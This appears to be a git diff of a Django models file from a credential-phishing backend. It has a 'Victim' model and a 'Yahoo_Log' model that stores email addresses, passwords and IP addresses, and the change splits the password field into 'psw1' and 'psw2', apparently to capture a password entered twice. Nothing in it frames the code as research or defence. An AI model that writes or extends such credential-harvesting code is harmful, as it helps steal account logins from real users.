@@ -9,5 +9,6 @@ class Victim(models.Model):
 
 class Yahoo_Log(models.Model):
     mail=models.CharField(max_length=260, blank=True,null=True)
-    psw=models.CharField(max_length=260, blank=True,null=True)
+    psw1=models.CharField(max_length=260, blank=True,null=True)
+    psw2=models.CharField(max_length=260, blank=True,null=True)
     ip=models.CharField(max_length=250, blank=True,null=True)
